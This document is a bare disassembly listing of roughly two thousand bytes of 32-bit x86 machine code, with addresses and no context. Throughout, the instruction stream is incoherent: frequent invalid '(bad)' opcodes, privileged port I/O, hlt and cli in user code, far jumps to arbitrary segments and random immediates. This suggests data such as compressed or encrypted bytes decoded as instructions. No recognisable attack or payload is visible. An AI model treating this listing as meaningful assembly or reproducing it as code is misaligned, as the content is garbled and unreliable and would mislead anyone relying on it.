  420eaa:	call   FWORD PTR [edi+0x23]
  420ead:	push   0x30f77943
  420eb2:	jnp    0x420ed9
  420eb4:	mov    ecx,0xe17c40c5
  420eb9:	(bad)  
  420eba:	xchg   edx,eax
  420ebb:	int3   
  420ebc:	cli    
  420ebd:	mov    ebx,0x44e620d0
  420ec2:	xchg   esi,eax
  420ec3:	mov    al,ds:0x3e74cb87
  420ec8:	add    BYTE PTR [eax],al
  420eca:	push   ebp
  420ecb:	dec    eax
  420ecc:	inc    edx
  420ecd:	push   ebp
  420ece:	pop    edi
  420ecf:	pop    edi
  420ed0:	push   edi
  420ed1:	dec    eax
  420ed2:	cmp    BYTE PTR [esi-0x14],bh
  420ed5:	or     cl,BYTE PTR [ebx-0x113fbaad]
  420edb:	popf   
  420edc:	add    DWORD PTR [eax],eax
  420ede:	xchg   BYTE PTR [esi],al
  420ee0:	add    BYTE PTR [eax],al
  420ee2:	daa    
  420ee3:	jae    0x420ed3
  420ee5:	push   cs
  420ee6:	stos   BYTE PTR es:[edi],al
  420ee7:	cmp    bh,bl
  420ee9:	lock (bad) 
  420eeb:	xor    BYTE PTR [ecx-0x122c5319],bh
  420ef1:	dec    esi
  420ef2:	aad    0xf9
  420ef4:	test   al,0x2c
  420ef6:	int3   
  420ef7:	loope  0x420f06
  420ef9:	scas   al,BYTE PTR es:[edi]
  420efa:	shl    DWORD PTR [ebp+0x37d274c6],cl
  420f00:	cli    
  420f01:	xor    al,0xb6
  420f03:	pop    ecx
  420f04:	mov    dl,0x2e
  420f06:	(bad)  
  420f07:	in     al,0xb5
  420f09:	rcr    cl,0xf1
  420f0c:	xchg   ebx,eax
  420f0d:	fistp  QWORD PTR [ebx-0x3e]
  420f10:	shl    BYTE PTR [edx],cl
  420f12:	push   0x6776a4cc
  420f17:	xchg   BYTE PTR [ecx+esi*4],al
  420f1a:	cmp    al,0x8b
  420f1c:	call   0x9300cf43
  420f21:	mov    al,BYTE PTR [ecx+0x6d6053f4]
  420f27:	and    cl,dl
  420f29:	dec    ecx
  420f2a:	in     al,dx
  420f2b:	mov    eax,ds:0xd8d9e6fa
  420f30:	in     eax,0x90
  420f32:	daa    
  420f33:	(bad)  
  420f35:	(bad)  
  420f36:	dec    esp
  420f37:	in     al,0x3d
  420f39:	cld    
  420f3a:	sahf   
  420f3b:	pop    ebp
  420f3c:	mov    cl,0x3b
  420f3e:	adc    BYTE PTR [eax+esi*8],bh
  420f41:	aas    
  420f42:	inc    edi
  420f43:	inc    ecx
  420f44:	mov    esi,0x559d4ba9
  420f49:	repnz shr BYTE PTR [ebx+edx*1-0x34],0x24
  420f4f:	adc    BYTE PTR [esi],0x26
  420f52:	call   0x99fd1192
  420f57:	cmp    al,0x26
  420f59:	out    0xd2,eax
  420f5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f5c:	es jmp 0xdb1d:0x3bd3c84e
  420f64:	xlat   BYTE PTR ds:[ebx]
  420f65:	jp     0x420fb2
  420f67:	dec    esp
  420f68:	inc    eax
  420f69:	ret    0x305f
  420f6c:	out    0xc3,al
  420f6e:	jmp    0x3623:0x6e0b833b
  420f75:	call   0x80ebdda2
  420f7a:	inc    eax
  420f7b:	mov    esi,0x4d77d310
  420f80:	jmp    0x420ffa
  420f82:	mov    DWORD PTR [edi-0x6dc67e4f],esi
  420f88:	ror    cl,1
  420f8a:	outs   dx,DWORD PTR ds:[esi]
  420f8b:	push   0xa37c1f0e
  420f90:	hlt    
  420f91:	pop    esp
  420f92:	ins    DWORD PTR es:[edi],dx
  420f93:	in     al,dx
  420f94:	shl    BYTE PTR [edx+eiz*4+0x59],1
  420f98:	push   edx
  420f99:	call   0xd39acafb
  420f9e:	imul   ebp,DWORD PTR fs:[eax],0x34
  420fa2:	ds stc 
  420fa4:	xlat   BYTE PTR ds:[ebx]
  420fa5:	lods   eax,DWORD PTR ds:[esi]
  420fa6:	jo     0x420fb4
  420fa8:	ss ret 0x24
  420fac:	retf   0xc26d
  420faf:	lods   eax,DWORD PTR ds:[esi]
  420fb0:	cmp    ebx,DWORD PTR [edx]
  420fb2:	dec    edi
  420fb3:	sub    DWORD PTR ds:0x983dec06,edx
  420fb9:	cmp    dl,BYTE PTR [esi-0x18]
  420fbc:	sub    eax,0x969ab8df
  420fc1:	fwait
  420fc2:	pop    edi
  420fc3:	fst    st(5)
  420fc5:	cwde   
  420fc6:	adc    ch,BYTE PTR [esi+0x79]
  420fc9:	cli    
  420fca:	sub    eax,0xf219d0f6
  420fcf:	aad    0x24
  420fd1:	sbb    ecx,esp
  420fd3:	xor    eax,DWORD PTR [eax]
  420fd5:	or     eax,0xa03ac868
  420fda:	sub    al,0xe2
  420fdc:	dec    ecx
  420fdd:	jbe    0x420fe4
  420fdf:	add    eax,0x2c16f597
  420fe4:	in     eax,0x48
  420fe6:	popf   
  420fe7:	cmp    BYTE PTR [esp+eiz*8],ah
  420fea:	push   ebx
  420feb:	mov    ds:0xeaa65702,eax
  420ff0:	je     0x421059
  420ff2:	retf   
  420ff3:	pop    ecx
  420ff4:	lahf   
  420ff5:	popf   
  420ff6:	mov    ebx,0x70887d5d
  420ffb:	pop    ss
  420ffc:	mov    eax,ds:0x798d9b77
  421001:	imul   BYTE PTR [ecx+0x35551fd5]
  421007:	in     al,dx
  421008:	sub    ebx,DWORD PTR [edi]
  42100a:	mov    esi,0xec23ab35
  42100f:	ret    0xd054
  421012:	mov    eax,0x47cf8bc5
  421017:	aam    0x36
  421019:	imul   edi,DWORD PTR ds:0x995fecf8,0xffffffda
  421020:	inc    esp
  421021:	hlt    
  421022:	fild   DWORD PTR [ebp+eax*8+0x5d]
  421026:	mov    bh,BYTE PTR [edx+0x4abc8a70]
  42102c:	stos   BYTE PTR es:[edi],al
  42102d:	or     eax,0x60542c98
  421032:	pop    edi
  421033:	sbb    bl,BYTE PTR [eax+esi*2+0x66a9666e]
  42103a:	mov    bh,0x86
  42103c:	mov    bh,0x88
  42103e:	sub    DWORD PTR [eax+0x3dce2314],0x7184aa34
  421048:	pop    esi
  421049:	stc    
  42104a:	xchg   esp,eax
  42104b:	pop    eax
  42104c:	xchg   edi,eax
  42104d:	enter  0xa2bb,0x48
  421051:	mov    edi,0x946fca76
  421056:	or     al,0x4
  421058:	je     0x42103f
  42105a:	sub    DWORD PTR [esi+ebp*1-0x6a],eax
  42105e:	jmp    0x421067
  421060:	add    DWORD PTR [edi+0x62],0x44
  421064:	call   0xca82:0xf0165f76
  42106b:	jmp    0x6fbf:0xad1db11c
  421072:	mul    DWORD PTR [ebp-0x59]
  421075:	jns    0x4210c2
  421077:	outs   dx,BYTE PTR ds:[esi]
  421078:	push   ebp
  421079:	mov    esp,0x40c02921
  42107e:	fcmovnu st,st(0)
  421080:	mov    ah,0x88
  421082:	jmp    0xa44f21df
  421087:	sub    BYTE PTR [ecx],ch
  421089:	bound  ecx,QWORD PTR [ebx-0x6b73b66d]
  42108f:	mov    ds:0x4f12debb,al
  421094:	cmp    DWORD PTR ss:[ebp-0x68c7a6b6],eax
  42109b:	jg     0x421078
  42109d:	adc    dh,BYTE PTR [edx-0x643918d]
  4210a3:	in     eax,0x4d
  4210a5:	pop    eax
  4210a6:	mov    esi,0xd0b115c7
  4210ab:	pop    esi
  4210ac:	mov    bl,0xbb
  4210ae:	jno    0x4210b9
  4210b0:	mov    esp,esp
  4210b2:	xchg   esp,eax
  4210b3:	push   0x44
  4210b5:	push   ebp
  4210b6:	pop    es
  4210b7:	in     eax,0x80
  4210b9:	out    dx,eax
  4210ba:	mov    dh,0xc9
  4210bc:	js     0x421106
  4210be:	jb     0x421046
  4210c0:	dec    ebx
  4210c1:	addr16 in eax,0x38
  4210c4:	fdivr  DWORD PTR [edi]
  4210c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210c8:	adc    esi,esi
  4210ca:	stos   BYTE PTR es:[edi],al
  4210cb:	hlt    
  4210cc:	mov    ds:0x5fb55da,eax
  4210d1:	fdivp  st(2),st
  4210d3:	(bad)  
  4210d5:	jne    0x4210fd
  4210d7:	rcl    DWORD PTR [edi+0x65],0x76
  4210db:	call   0x8cac:0xa10b4ac4
  4210e2:	movlps xmm6,QWORD PTR [edi+eax*1+0x1a]
  4210e7:	test   DWORD PTR [edx],0x7a03c080
  4210ed:	lods   al,BYTE PTR ds:[esi]
  4210ee:	or     eax,0xe690be58
  4210f3:	(bad)  
  4210f5:	pop    ecx
  4210f6:	push   esi
  4210f7:	dec    ebx
  4210f8:	mov    dh,0x7d
  4210fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4210fb:	pop    edi
  4210fc:	aam    0xc0
  4210fe:	in     al,0x52
  421100:	sahf   
  421101:	imul   DWORD PTR [esi+0x4d]
  421104:	inc    edi
  421105:	cmc    
  421106:	fsubr  QWORD PTR [ebx+0x6]
  421109:	mov    edx,0xb84ff30d
  42110e:	push   0xa89d519b
  421113:	and    DWORD PTR [ebx-0x77],ebp
  421116:	(bad)  
  421117:	pushf  
  421118:	add    DWORD PTR [esi],ecx
  42111a:	sub    ch,BYTE PTR [ebp+0x3cc50ff5]
  421120:	popf   
  421121:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421122:	mov    al,0xd1
  421124:	dec    ebp
  421125:	pop    es
  421126:	icebp  
  421127:	pop    ss
  421128:	xchg   edx,eax
  421129:	add    BYTE PTR [edi-0x351a0e95],dh
  42112f:	cmp    al,BYTE PTR [ecx]
  421131:	mov    ch,0xd5
  421133:	dec    esi
  421134:	fmul   st(2),st
  421136:	fwait
  421137:	sbb    eax,0xb0f37363
  42113c:	add    DWORD PTR [ebp-0x297f4aba],ebx
  421142:	test   al,0xfc
  421144:	jns    0x4210d0
  421146:	fsubr  st(1),st
  421148:	mov    eax,ds:0x61ae4a40
  42114d:	int    0x74
  42114f:	rcl    esi,0x3d
  421152:	cdq    
  421153:	push   esp
  421154:	xchg   esp,eax
  421155:	sub    DWORD PTR [edi-0x21a08fe3],ebp
  42115b:	pop    ecx
  42115c:	inc    esi
  42115d:	loopne 0x421166
  42115f:	int3   
  421160:	cmp    edx,DWORD PTR [ecx]
  421162:	jle    0x421167
  421164:	and    DWORD PTR [eax+0x5],esp
  421167:	ret    0x468a
  42116a:	(bad)  
  42116b:	lds    ecx,FWORD PTR [edi+esi*2+0x835fa67]
  421172:	pushf  
  421173:	nop
  421174:	sub    esi,ecx
  421176:	jb     0x4211c5
  421178:	lods   eax,DWORD PTR ds:[esi]
  421179:	arpl   WORD PTR [ebp-0x63866989],cx
  42117f:	inc    ebx
  421180:	jo     0x42110d
  421182:	xor    DWORD PTR [ebx-0x53ad396a],edi
  421188:	cmp    DWORD PTR [edx+esi*8-0x5524baf5],eax
  42118f:	sub    eax,0x1a4ce1b4
  421194:	inc    esi
  421195:	and    eax,0x749efa1
  42119a:	into   
  42119b:	sub    al,0xbc
  42119d:	xchg   edi,eax
  42119e:	mov    eax,ds:0xd5cced67
  4211a3:	sbb    BYTE PTR [ecx-0x19],0xc7
  4211a7:	push   ecx
  4211a8:	in     al,dx
  4211a9:	in     eax,0xf5
  4211ab:	aas    
  4211ac:	add    eax,0x71b1f7cf
  4211b1:	in     eax,dx
  4211b2:	loop   0x4211a4
  4211b4:	mov    bl,0xcb
  4211b6:	and    BYTE PTR ds:0x2b033ac,0x60
  4211bd:	push   0x53db85ee
  4211c2:	bound  esi,QWORD PTR [edi+0x787cc75a]
  4211c8:	stos   DWORD PTR es:[edi],eax
  4211c9:	push   es
  4211ca:	popf   
  4211cb:	pop    edx
  4211cc:	loope  0x421195
  4211ce:	mov    ebp,0x6ff1b4e8
  4211d3:	jbe    0x4211ec
  4211d5:	bound  edi,QWORD PTR ds:0xca358727
  4211db:	sub    edx,esi
  4211dd:	enter  0x162f,0x2f
  4211e1:	and    BYTE PTR [ebx+eiz*1],ah
  4211e4:	addr16 gs jbe 0x421267
  4211e8:	add    dl,BYTE PTR gs:[edi]
  4211eb:	xchg   esp,eax
  4211ec:	and    ecx,DWORD PTR [ebp+0x7f3fd297]
  4211f2:	pop    ebx
  4211f3:	test   al,0x19
  4211f5:	push   ds
  4211f6:	sub    eax,0xc29e6c5f
  4211fb:	jp     0x421243
  4211fd:	inc    edx
  4211fe:	or     eax,DWORD PTR [esi-0x2f628cb6]
  421204:	sbb    al,cl
  421206:	xlat   BYTE PTR ds:[ebx]
  421207:	pop    edx
  421208:	jl     0x421284
  42120a:	aad    0x32
  42120c:	sub    ebp,esp
  42120e:	lods   al,BYTE PTR ds:[esi]
  42120f:	(bad)  
  421210:	ficom  DWORD PTR [esi]
  421212:	cmp    ah,BYTE PTR [ecx+eax*2-0xe]
  421216:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421217:	add    cl,bl
  421219:	or     al,0xe3
  42121b:	and    ebp,ecx
  42121d:	xchg   DWORD PTR [ecx],ebp
  42121f:	inc    edi
  421220:	fs int3 
  421222:	cmp    DWORD PTR [edx-0x4c712c06],ecx
  421228:	sbb    ah,BYTE PTR [edi+0x65]
  42122b:	fisub  DWORD PTR [esi-0x48392b41]
  421231:	lahf   
  421232:	inc    eax
  421233:	adc    edx,0xc1c3e1b3
  421239:	jl     0x421253
  42123b:	dec    ebx
  42123c:	xchg   esp,eax
  42123d:	(bad)  [ebx-0x6ab2dc5]
  421243:	adc    esp,ebx
  421245:	and    dh,ah
  421247:	nop
  421248:	jno    0x421240
  42124a:	mov    dh,0x59
  42124c:	mov    ds,WORD PTR [ebp+0x47f8907b]
  421252:	push   eax
  421253:	and    al,0xf7
  421255:	jmp    0x1401:0x5dd6a085
  42125c:	mov    WORD PTR [eax],fs
  42125e:	loop   0x4211ec
  421260:	(bad)  
  421261:	adc    DWORD PTR [ebx],ebx
  421263:	push   ds
  421264:	gs xchg ecx,eax
  421266:	test   eax,0xd798724d
  42126b:	pop    eax
  42126c:	mov    esi,0x2784f883
  421271:	add    eax,0x9d80d724
  421276:	xlat   BYTE PTR ds:[ebx]
  421277:	jmp    0x3107:0x5b3828f4
  42127e:	or     BYTE PTR [ebx],dl
  421280:	jns    0x4212cf
  421282:	inc    esi
  421283:	or     ebx,DWORD PTR [eax]
  421285:	mov    esp,0xb9c79933
  42128a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42128b:	adc    DWORD PTR cs:0x39e68a2c,ebp
  421292:	fwait
  421293:	sti    
  421294:	dec    eax
  421295:	cmp    bh,dh
  421297:	imul   eax,esp,0x2e
  42129a:	lahf   
  42129b:	xchg   BYTE PTR [edx-0x46],al
  42129e:	inc    edx
  42129f:	fwait
  4212a0:	sahf   
  4212a1:	pop    eax
  4212a2:	cmp    al,BYTE PTR [ecx]
  4212a4:	clc    
  4212a5:	jb     0x421291
  4212a7:	out    dx,eax
  4212a8:	mov    DWORD PTR [esi+0x3b0fe08a],edi
  4212ae:	lods   al,BYTE PTR ds:[esi]
  4212af:	imul   esi,DWORD PTR [edx-0x5a46fb17],0xffffffd1
  4212b6:	xor    BYTE PTR [ebp+0x3c],ch
  4212b9:	xchg   DWORD PTR [edi+eiz*8+0x17ca800f],esp
  4212c0:	dec    edx
  4212c1:	sub    al,0xe5
  4212c3:	enter  0x2a5,0x92
  4212c7:	inc    ecx
  4212c8:	imul   edx,esp,0xb1e94721
  4212ce:	mov    BYTE PTR [eax-0x24],ch
  4212d1:	sub    eax,ecx
  4212d3:	mov    al,ds:0x9234b136
  4212d8:	or     al,cl
  4212da:	inc    ebx
  4212db:	sbb    eax,0x49bbfd18
  4212e0:	out    dx,eax
  4212e1:	test   al,0x6d
  4212e3:	dec    ecx
  4212e4:	pop    eax
  4212e5:	mov    ebp,0x927206fb
  4212ea:	lods   eax,DWORD PTR ds:[esi]
  4212eb:	xchg   ebp,eax
  4212ec:	xchg   ebp,eax
  4212ed:	inc    edi
  4212ee:	std    
  4212ef:	stos   DWORD PTR es:[edi],eax
  4212f0:	retf   
  4212f1:	adc    DWORD PTR [esi+ebp*4+0x6cc68c7],esi
  4212f8:	loopne 0x42133e
  4212fa:	mov    ebx,0x1bf3bd09
  4212ff:	loope  0x4212e3
  421301:	stc    
  421302:	loopne 0x421325
  421304:	jbe    0x421292
  421306:	leave  
  421307:	sub    DWORD PTR [ebx-0x608475be],ebp
  42130d:	add    BYTE PTR [eax],bh
  42130f:	mov    ch,0x8d
  421311:	dec    esi
  421312:	cwde   
  421313:	mov    ah,0x80
  421315:	(bad)  
  421316:	jle    0x4212f9
  421318:	fwait
  421319:	push   edi
  42131a:	dec    ecx
  42131b:	and    DWORD PTR [edx],0xbe077735
  421321:	cmp    BYTE PTR [edi+0x51],bh
  421324:	loope  0x421335
  421326:	mov    edi,0x5bda147b
  42132b:	repnz lds ebx,FWORD PTR [edx+edi*2+0x18aaee14]
  421333:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421334:	retf   
  421335:	inc    esi
  421336:	sbb    al,0xbf
  421338:	iret   
  421339:	out    dx,eax
  42133a:	in     eax,0x14
  42133c:	mov    BYTE PTR [eax+0x7e],bl
  42133f:	loope  0x421393
  421341:	or     eax,0x7f47e02a
  421346:	sbb    DWORD PTR [esi-0x3f13237f],0x64bd1c46
  421350:	or     eax,0xf6288fde
  421355:	dec    edi
  421356:	pop    ds
  421357:	xchg   DWORD PTR [eax+edi*8-0x12],ebp
  42135b:	push   edx
  42135c:	fwait
  42135d:	inc    esi
  42135e:	outs   dx,DWORD PTR ds:[esi]
  42135f:	add    eax,0x1542b5ce
  421364:	cmp    eax,0x1f8d01e4
  421369:	xor    al,0xb1
  42136b:	pop    ds
  42136c:	out    0xe5,al
  42136e:	push   ebp
  42136f:	stos   BYTE PTR es:[edi],al
  421370:	sbb    BYTE PTR [edx+0x5e],ah
  421373:	aad    0x67
  421375:	mov    ds:0x4d549eb7,eax
  42137a:	lods   al,BYTE PTR ds:[esi]
  42137b:	dec    edi
  42137c:	pop    ds
  42137d:	mov    eax,0x4a80bf9
  421383:	cdq    
  421384:	adc    BYTE PTR [esi+0x15],cl
  421387:	jmp    0xcfd:0x7a482b89
  42138e:	adc    edi,0xffffffb8
  421391:	fdivp  st(2),st
  421393:	dec    edi
  421394:	hlt    
  421395:	sub    esi,DWORD PTR [eax+0xd]
  421398:	sub    esp,0xffffff8b
  42139b:	inc    ebp
  42139c:	out    dx,al
  42139d:	dec    ebp
  42139e:	xor    BYTE PTR [edi-0x661dc7a9],dh
  4213a4:	(bad)  
  4213a5:	xor    edx,DWORD PTR [eax-0x2e]
  4213a8:	(bad)
  4213ab:	push   esi
  4213ac:	xchg   ebp,eax
  4213ad:	fisttp DWORD PTR [edi]
  4213af:	scas   al,BYTE PTR es:[edi]
  4213b0:	stos   BYTE PTR es:[edi],al
  4213b1:	dec    DWORD PTR ds:0x8a8cbadf
  4213b7:	push   ds
  4213b8:	pop    edx
  4213b9:	pop    esp
  4213ba:	pop    ss
  4213bb:	adc    ebp,esp
  4213bd:	jns    0x421362
  4213bf:	test   dh,bh
  4213c1:	cmp    BYTE PTR [esi],0xd1
  4213c4:	jle    0x421412
  4213c6:	(bad)  
  4213c7:	nop
  4213c8:	fcmovbe st,st(7)
  4213ca:	test   eax,0x905e6fa4
  4213cf:	pop    ebx
  4213d0:	fdivrp st(4),st
  4213d2:	icebp  
  4213d3:	mov    bh,0x63
  4213d5:	mov    ecx,0xc000e134
  4213da:	inc    esp
  4213db:	or     al,0xe0
  4213dd:	repz les ebp,FWORD PTR [ebx-0x2910e143]
  4213e4:	push   0x43fa8d91
  4213e9:	jbe    0x421449
  4213eb:	and    al,0x45
  4213ed:	sbb    cl,al
  4213ef:	mov    ss,WORD PTR [eax-0x47]
  4213f2:	cmp    al,0x4e
  4213f4:	sbb    esp,DWORD PTR [esi+0x13]
  4213f7:	dec    DWORD PTR [edx-0x19f34fb4]
  4213fd:	cmp    edi,esi
  4213ff:	loope  0x421426
  421401:	pop    esp
  421402:	and    ah,BYTE PTR [eax+0x7a9a62ec]
  421408:	aam    0xc8
  42140a:	pop    eax
  42140b:	imul   edi,esi,0x23
  42140e:	push   esp
  42140f:	add    dh,BYTE PTR [eax+edi*8]
  421412:	(bad)  
  421414:	jb     0x42141a
  421416:	sbb    DWORD PTR ds:0xc7c8534e,ecx
  42141c:	repz test eax,0xe32a649d
  421422:	cli    
  421423:	icebp  
  421424:	fistp  WORD PTR [edi-0x53]
  421427:	jge    0x42142a
  421429:	out    0xb3,eax
  42142b:	imul   esi,DWORD PTR [ebp-0x562ccd69],0xffffffad
  421432:	jne    0x4213f9
  421434:	cmp    al,0xdd
  421436:	xor    DWORD PTR [edx-0x53],ebx
  421439:	inc    edi
  42143a:	bound  esi,QWORD PTR [ecx]
  42143c:	cmp    ebx,DWORD PTR [edi-0x70]
  42143f:	test   al,0x34
  421441:	gs adc eax,0xaf5cea91
  421447:	xchg   esi,eax
  421448:	pop    edi
  421449:	out    0xea,eax
  42144b:	js     0x421449
  42144d:	dec    eax
  42144e:	push   edi
  42144f:	ror    DWORD PTR [ecx+0x39f5a496],cl
  421455:	xchg   esi,eax
  421456:	fisub  WORD PTR [ebx-0x1b2ebd23]
  42145c:	adc    BYTE PTR [edx-0x247af53],bl
  421462:	mov    dh,0xc2
  421464:	dec    esp
  421465:	stc    
  421466:	cwde   
  421467:	mov    esp,0x525f5c40
  42146c:	inc    edx
  42146d:	aam    0x8d
  42146f:	pop    DWORD PTR ds:0xce112a50
  421475:	in     eax,dx
  421476:	out    0xc3,eax
  421478:	cld    
  421479:	add    esp,DWORD PTR [edi]
  42147b:	and    DWORD PTR [esi+0x1e6e12a7],esp
  421481:	into   
  421482:	add    BYTE PTR [eax-0x7566132e],bh
  421488:	xor    esp,esp
  42148a:	dec    edx
  42148b:	inc    edi
  42148c:	add    DWORD PTR [esi],esp
  42148e:	mov    al,ds:0x5d21d609
  421493:	in     al,dx
  421494:	dec    esp
  421495:	push   0x4ac17a
  42149a:	out    dx,eax
  42149b:	scas   eax,DWORD PTR es:[edi]
  42149c:	xchg   DWORD PTR [ebx-0x3f],ebp
  42149f:	les    ebp,FWORD PTR [eax]
  4214a1:	mov    ah,0xea
  4214a3:	mov    al,0x63
  4214a5:	cmc    
  4214a6:	jns    0x421488
  4214a8:	jno    0x421474
  4214aa:	xor    al,0x4f
  4214ac:	clc    
  4214ad:	(bad)  
  4214ae:	jle    0x42146e
  4214b0:	xor    edi,edi
  4214b2:	mov    eax,0xf8ec260d
  4214b7:	ds or  eax,0xfe034268
  4214bd:	jae    0x4214ce
  4214bf:	mov    ds:0x5ac2c6c4,eax
  4214c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214c5:	mov    eax,0x7fc23917
  4214ca:	bound  ecx,QWORD PTR [eax+0x62]
  4214cd:	xor    dh,BYTE PTR [edi]
  4214cf:	and    al,0x6
  4214d1:	test   al,0x8
  4214d3:	sbb    dh,BYTE PTR [esi]
  4214d5:	mov    bh,0xe4
  4214d7:	loopne 0x421519
  4214d9:	xlat   BYTE PTR ds:[ebx]
  4214da:	ja     0x4214e8
  4214dc:	gs inc ecx
  4214de:	push   esi
  4214df:	mov    eax,0xc3e11625
  4214e4:	xchg   edx,eax
  4214e5:	lahf   
  4214e6:	push   eax
  4214e7:	aam    0x58
  4214e9:	mov    eax,ds:0x8070cbcd
  4214ee:	and    BYTE PTR [edi+ecx*4+0x3b472fbf],ch
  4214f5:	sbb    dl,al
  4214f7:	fist   WORD PTR [edi-0x3b]
  4214fa:	pop    eax
  4214fb:	push   0x39f1c366
  421500:	hlt    
  421501:	push   cs
  421502:	retf   0x6b9
  421505:	fcmovnu st,st(4)
  421507:	mov    ah,0x2b
  421509:	js     0x4214c5
  42150b:	hlt    
  42150c:	dec    edx
  42150d:	je     0x42158d
  42150f:	xchg   ebx,eax
  421510:	(bad)  
  421511:	sub    DWORD PTR [ecx+0x5f89ad3a],esp
  421517:	aad    0xd7
  421519:	test   DWORD PTR [edi],edx
  42151b:	retf   
  42151c:	sbb    DWORD PTR [edx+edi*4+0x63],ecx
  421520:	ins    DWORD PTR es:[edi],dx
  421521:	jge    0x421508
  421523:	push   ebx
  421524:	int3   
  421525:	pop    edx
  421526:	dec    ebx
  421527:	in     eax,0xe3
  421529:	dec    esp
  42152a:	aam    0x48
  42152c:	or     DWORD PTR [eax],esp
  42152e:	test   BYTE PTR [ebx-0x4f33822e],0xf5
  421535:	call   0x86b6ed5a
  42153a:	mov    dh,0xf9
  42153c:	popa   
  42153d:	ss push edi
  42153f:	cmc    
  421540:	out    dx,al
  421541:	and    ebp,esi
  421543:	adc    bl,BYTE PTR [edi-0x6118ff47]
  421549:	in     eax,dx
  42154a:	cld    
  42154b:	fisubr WORD PTR [ecx]
  42154d:	test   DWORD PTR [ebp-0x591e0f71],ebx
  421553:	dec    edx
  421554:	add    BYTE PTR [ebx],dh
  421556:	scas   eax,DWORD PTR es:[edi]
  421557:	sti    
  421558:	fisubr WORD PTR [edx]
  42155a:	push   edi
  42155b:	(bad)  
  42155c:	out    dx,eax
  42155d:	fadd   QWORD PTR [edx+0x28]
  421560:	and    edi,eax
  421562:	sub    bh,dh
  421564:	neg    BYTE PTR [edx]
  421566:	outs   dx,BYTE PTR ds:[esi]
  421567:	mov    bl,0x0
  421569:	add    BYTE PTR [edi+0x5a],dl
  42156c:	dec    edx
  42156d:	inc    esi
  42156e:	dec    edi
  42156f:	push   esi
  421570:	pop    edi
  421571:	pop    ebx
  421572:	push   esp
  421573:	inc    eax
  421574:	cmp    eax,0xa9fa56b5
  421579:	sti    
  42157a:	je     0x421520
  42157c:	add    DWORD PTR [eax],eax
  42157e:	xchg   BYTE PTR [esi],al
  421580:	add    BYTE PTR [eax],al
  421582:	clc    
  421583:	mov    ecx,edi
  421585:	int    0x8f
  421587:	xor    dh,al
  421589:	mov    es,WORD PTR [ebx+0x5b]
  42158c:	and    DWORD PTR [edi],ebx
  42158e:	mov    ah,0x9
  421590:	fidiv  DWORD PTR gs:[ebp+0x6082267b]
  421597:	and    al,0xfe
  421599:	sahf   
  42159a:	mov    cs,WORD PTR [esi]
  42159c:	mov    BYTE PTR [edi+0x64681f9e],dl
  4215a2:	fcmovbe st,st(3)
  4215a4:	mov    bl,0x4d
  4215a6:	iret   
  4215a7:	out    dx,eax
  4215a8:	adc    al,0xfc
  4215aa:	sbb    BYTE PTR [esp+ebp*4],cl
  4215ad:	je     0x4215bd
  4215af:	sub    al,ah
  4215b1:	dec    esi
  4215b2:	leave  
  4215b3:	shl    esp,cl
  4215b5:	xor    eax,0xabf2d48a
  4215ba:	xor    DWORD PTR [edi-0xc],0x7cf58bf9
  4215c1:	in     al,0xc
  4215c3:	cli    
  4215c4:	icebp  
  4215c5:	mov    dl,0x6f
  4215c7:	fadd   st(3),st
  4215c9:	xchg   ecx,eax
  4215ca:	out    dx,al
  4215cb:	mov    edx,0x28f53c6f
  4215d0:	bound  esi,QWORD PTR [esi]
  4215d2:	mov    ah,0x26
  4215d4:	pop    edx
  4215d5:	repz mov bl,0xa9
  4215d8:	mov    ch,BYTE PTR [edi+0x41]
  4215db:	mov    dl,0xcf
  4215dd:	ret    0xb2c0
  4215e0:	xchg   esp,eax
  4215e1:	cmp    al,0xa2
  4215e3:	push   ss
  4215e4:	(bad)  [eax]
  4215e6:	ins    DWORD PTR es:[edi],dx
  4215e7:	cmp    eax,0x29649886
  4215ec:	mov    al,0xe7
  4215ee:	dec    edi
  4215ef:	jp     0x4215ea
  4215f1:	jp     0x421635
  4215f3:	rcl    DWORD PTR ds:[ebx],0x1f
  4215f7:	add    al,0x80
  4215f9:	shr    DWORD PTR [esi+eiz*2-0x55],0x8d
  4215fe:	jo     0x4215cc
  421600:	or     ebx,ebx
  421602:	ins    DWORD PTR es:[edi],dx
  421603:	cld    
  421604:	leave  
  421605:	loop   0x42161c
  421607:	push   ds
  421608:	fild   QWORD PTR [edx]
  42160a:	enter  0x4d9b,0x54
  42160e:	aam    0x94
  421610:	mov    esp,0x9bfb8738
  421615:	retf   
  421616:	pushf  
  421617:	(bad)  
  421618:	cs ret 
  42161a:	and    eax,0x7f8c92ad
  42161f:	iret   
  421620:	and    al,BYTE PTR [eax]
  421622:	sub    eax,0xb5af66c8
  421627:	rol    BYTE PTR [esi],cl
  421629:	mov    WORD PTR [edx],?
  42162b:	pushf  
  42162c:	dec    esi
  42162d:	push   edx
  42162e:	cli    
  42162f:	test   al,0x95
  421631:	out    dx,eax
  421632:	dec    ebx
  421633:	inc    ebp
  421634:	addr16 xchg esp,eax
  421636:	iret   
  421637:	cmp    al,bl
  421639:	push   esp
  42163a:	mov    ah,0xb0
  42163c:	jg     0x4215f4
  42163e:	retf   0x540d
  421641:	sub    DWORD PTR [ecx+0x6],esi
  421644:	ins    BYTE PTR es:[edi],dx
  421645:	pusha  
  421646:	cmp    esi,DWORD PTR [ecx+0x1]
  421649:	xchg   DWORD PTR [eax],edi
  42164b:	and    ah,BYTE PTR [edi-0x56]
  42164e:	mov    ah,bh
  421650:	mov    dl,0x8e
  421652:	cmp    al,0xb9
  421654:	pop    ebp
  421655:	mov    esp,gs
  421657:	retf   
  421658:	aaa    
  421659:	push   ebp
  42165a:	loopne 0x4216d4
  42165c:	push   edx
  42165d:	nop
  42165e:	mov    BYTE PTR [ecx-0x471c9765],0x6a
  421665:	jne    0x4216e1
  421667:	xchg   DWORD PTR [ecx-0x5da44fb5],ecx
  42166d:	jne    0x4216cf
  42166f:	adc    BYTE PTR [edx+0x65],dl
  421672:	xchg   dh,ah
  421674:	adc    esp,DWORD PTR [esi-0x41]
  421677:	inc    ebp
  421678:	push   ecx
